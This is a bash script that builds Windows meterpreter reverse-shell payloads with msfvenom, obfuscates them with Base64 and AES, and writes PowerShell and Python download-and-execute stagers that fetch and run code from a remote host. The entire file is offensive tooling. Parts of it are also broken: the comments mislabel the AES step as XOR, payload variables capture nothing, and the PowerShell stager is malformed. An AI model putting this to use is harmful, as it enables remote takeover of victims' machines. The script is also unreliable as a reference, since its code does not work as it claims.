#!/bin/bash

# Set the target IP and port
target_ip="192.168.1.1"
target_port="4444"

# Set the URL for the payload download
url="http://$target_ip/payload"

# Set the output directory
output_dir="./payloads"

# Create the output directory if it doesn't exist
if [ ! -d "$output_dir" ]; then
  mkdir -p "$output_dir"
fi

# Generate a PowerShell payload using MSFVenom
echo "Generating PowerShell payload..."
ps_payload=$(msfvenom -p windows/meterpreter/reverse_tcp LHOST=$target_ip LPORT=$target_port -f psh -o "$output_dir/payload.ps1")

# Encode the PowerShell payload using Base64 and write it to a file
echo "Encoding PowerShell payload..."
echo "$ps_payload" | base64 -w0 > "$output_dir/payload.ps1.b64"

# Generate a Python payload using MSFVenom
echo "Generating Python payload..."
py_payload=$(msfvenom -p windows/meterpreter/reverse_tcp LHOST=$target_ip LPORT=$target_port -f raw -o "$output_dir/payload.py")

# Encode the Python payload using XOR and write it to a file
echo "Encoding Python payload..."
key=$(openssl rand -hex 16)
echo "Key: $key"
echo "$py_payload" | openssl enc -e -aes-256-cbc -K "$key" -iv 0 -nosalt | xxd -p | tr -d '\n' > "$output_dir/payload.py.enc"
echo "$key" > "$output_dir/key.txt"

# Generate the PowerShell download and execute payload
echo "Generating PowerShell download and execute payload..."
ps_download_payload="$('$url'|iex)"
echo "$ps_download_payload" | base64 -w0 > "$output_dir/payload_download.ps1.b64"

# Generate the Python download and execute payload
echo "Generating Python download and execute payload..."
py_download_payload="import requests;exec(requests.get('$url').content)"
echo "$py_download_payload" > "$output_dir/payload_download.py"

echo "Payloads generated and encoded successfully."
